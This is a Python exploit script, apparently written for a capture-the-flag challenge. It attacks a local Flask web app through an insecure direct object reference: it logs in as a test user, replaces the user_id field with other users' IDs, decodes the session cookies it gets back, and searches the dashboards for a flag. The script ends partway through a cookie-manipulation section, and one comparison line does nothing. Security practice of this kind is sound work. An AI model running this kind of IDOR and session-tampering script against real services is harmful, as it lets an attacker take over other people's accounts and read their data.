import requests
import re

base_url = "http://127.0.0.1:33029"

print("IDOR Fuzzing with Proper Cookie Handling")
print("=" * 60)

# First, let's get a valid session cookie by completing the auth flow
def get_authenticated_session():
    session = requests.Session()
    
    # Step 1: Authenticate
    auth_data = {"username": "test", "password": "test"}
    auth_resp = session.post(f"{base_url}/", data=auth_data, allow_redirects=True)
    
    # Step 2: Complete password verification
    pass_data = {"password": "test", "user_id": "10032"}
    pass_resp = session.post(f"{base_url}/password/test", data=pass_data, allow_redirects=False)
    
    # Extract session from Set-Cookie header
    set_cookie = pass_resp.headers.get('Set-Cookie', '')
    session_match = re.search(r'session=([^;]+)', set_cookie)
    if session_match:
        session_value = session_match.group(1)
        # Update the session cookie
        session.cookies.set('session', session_value)
        return session, session_value
    return None, None

# Get baseline session
baseline_session, baseline_cookie = get_authenticated_session()
if not baseline_session:
    print("[!] Failed to get authenticated session")
else:
    print(f"[+] Got baseline session: {baseline_cookie[:30]}...")

    # Test with baseline user_id (10032)
    dash_resp = baseline_session.get(f"{base_url}/dashboard")
    print(f"\n[+] Baseline dashboard (user_id=10032):")
    print(f"  Status: {dash_resp.status_code}")
    print(f"  Length: {len(dash_resp.text)}")

    # Check if we're seeing a real dashboard or being redirected
    if 'dashboard' in dash_resp.url.lower():
        print(f"  URL confirms: {dash_resp.url}")
    else:
        print(f"  Redirected to: {dash_resp.url}")

    # Check for FLAG
    if 'FLAG' in dash_resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
        print(f"  [!] FLAG: {flag_match.group(0) if flag_match else 'Found but pattern mismatch'}")

    # Now test with different user_ids
    print("\n" + "=" * 60)
    print("Testing IDOR with different user_ids")
    print("=" * 60)

    test_ids = [10030, 10031, 10033, 10034, 10035, 10000, 10100]

    for test_id in test_ids:
        # Start fresh session
        test_session = requests.Session()

        # Authenticate
        auth_resp = test_session.post(f"{base_url}/", data={"username": "test", "password": "test"}, allow_redirects=True)

        # Post with target user_id
        pass_data = {"password": "test", "user_id": str(test_id)}
        pass_resp = test_session.post(f"{base_url}/password/test", data=pass_data, allow_redirects=False)

        # Get the session cookie from response
        set_cookie = pass_resp.headers.get('Set-Cookie', '')
        session_match = re.search(r'session=([^;]+)', set_cookie)

        if session_match:
            session_value = session_match.group(1)
            test_session.cookies.set('session', session_value)

            # Now get dashboard
            dash_resp = test_session.get(f"{base_url}/dashboard")

            # Decode session to see what user_id is stored
            import base64
            try:
                # Flask session format: payload.timestamp.signature
                payload = session_value.split('.')[0]
                # Add padding if needed
                padded = payload + '=' * (4 - len(payload) % 4)
                decoded = base64.urlsafe_b64decode(padded)
                session_data = decoded.decode()
            except:
                session_data = "Could not decode"

            print(f"\n[+] user_id={test_id}:")
            print(f"  Session data: {session_data}")
            print(f"  Dashboard URL: {dash_resp.url}")
            print(f"  Dashboard Length: {len(dash_resp.text)}")

            # Check if the user_id in session matches what we sent
            if str(test_id) in session_data:
                print(f"  [+] Session contains requested user_id!")
            elif '10032' in session_data:
                print(f"  [-] Session still has user_id=10032 (not vulnerable to this ID)")

            # Look for user-specific content
            if 'FLAG' in dash_resp.text:
                flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
                print(f"  [!] FLAG: {flag_match.group(0) if flag_match else 'Pattern found'}")

            # Compare content with baseline
            if len(dash_resp.text) != len(dash_resp.text):  # Same var, placeholder
                pass
        else:
            print(f"\n[+] user_id={test_id}: No session cookie set")

# Also try cookie manipulation directly
print("\n" + "=" * 60)
print("Direct Cookie Manipulation Test")
print("=" * 60)

# Get a valid session first
session = requests.Session()
auth_resp = session.post(f"{base_url}/", data={"username": "test", "password": "test"}, allow_redirects=True)
pass_data = {"password": "test", "user_id": "10032"}
pass_resp = session.post(f"{base_url}/password/test", data=pass_data, allow_redirects=False)

original_cookie = None
